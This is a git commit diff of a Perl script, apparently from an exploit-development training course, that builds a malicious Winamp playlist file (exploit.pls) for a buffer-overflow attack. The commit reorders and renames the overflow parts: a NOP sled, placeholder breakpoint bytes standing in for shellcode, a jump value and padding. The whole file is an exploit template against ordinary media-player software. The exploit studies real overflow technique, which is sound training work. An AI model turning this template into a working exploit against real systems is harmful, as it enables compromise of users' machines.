04ac09abb9b40bbf15c1dd88ae5d6a3394d77079
bigb0ss <49355913+bigb0sss@users.noreply.github.com>
2020-06-01 01:06:16 -0400

    Update winamp_template.pl

--- module_0x06/winamp_template.pl
+++ module_0x06/winamp_template.pl
@@ -7,14 +7,23 @@
 
 
 $start= "[playlist]\r\nFile1=\\\\";
-$nop="\x90" x 856;
-$shellcode ="\xcc" x 166;
-$jmp="\x41\x41\x41\x41"."\x83\x83\x83\x83\x83\x83\x83\x83"."\x90\x90\x90\x90";
+
+$jmp="\x41\x41\x41\x41";
+
+$stage1="\x83\x83\x83\x83\x83\x83\x83\x83"."\x90\x90\x90\x90";
+
+$stage2="\xcc" x 166;
+
+$stage3="\x90" x 856;
+
 $end="\r\nTitle1=pwnd\r\nLength1=512\r\nNumberofEntries=1\r\nVersion=2\r\n";
+
 open (MYFILE, '>>exploit.pls');
+
 print MYFILE $start;          
-print MYFILE $nop;            
-print MYFILE $shellcode;      
+print MYFILE $stage3;            
+print MYFILE $stage2;      
 print MYFILE $jmp;                
+print MYFILE $stage1;
 print MYFILE $end;
 close (MYFILE);
